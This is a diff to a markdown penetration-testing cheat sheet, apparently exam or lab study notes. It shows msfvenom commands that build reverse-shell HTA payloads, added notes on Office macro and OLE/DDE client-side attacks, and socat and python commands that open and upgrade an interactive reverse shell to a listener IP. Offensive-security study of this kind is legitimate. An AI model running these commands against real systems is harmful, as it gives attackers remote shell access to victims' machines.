@@ -77,6 +77,11 @@ We will use msfvenom to turn our basic HTML Application into an attack, relying 
 msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
 ````
+### Exploiting Microsoft Office
+When leveraging client-side vulnerabilities, it is important to use applications that are trusted by the victim in their everyday line of work. Unlike potentially suspicious-looking web links, Microsoft Office1 client-side attacks are often successful because it is difficult to differentiate malicious content from benign. In this section, we will explore various client-side attack vectors that leverage Microsoft Office applications
+#### Microsoft Word Macro
+#### Object Linking and Embedding
+Another popular client-side attack against Microsoft Office abuses Dynamic Data Exchange (DDE)1 to execute arbitrary applications from within Office documents, but this has been patched since December of 2017. In this attack scenario, we are going to embed a Windows batch file5 inside a Microsoft Word document.
 ### Hashing & Cracking
 #### Enumeration
 ````
@@ -202,6 +207,18 @@ findstr /spin "password" *.*
 ````
 
 ## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
+### Linux
+````
+which python
+which python2
+which python3
+python -c ‘import pty; pty.spawn(“/bin/bash”)’
+````
+````
+which socat
+socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
+````
 
 ## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
 ### Tools
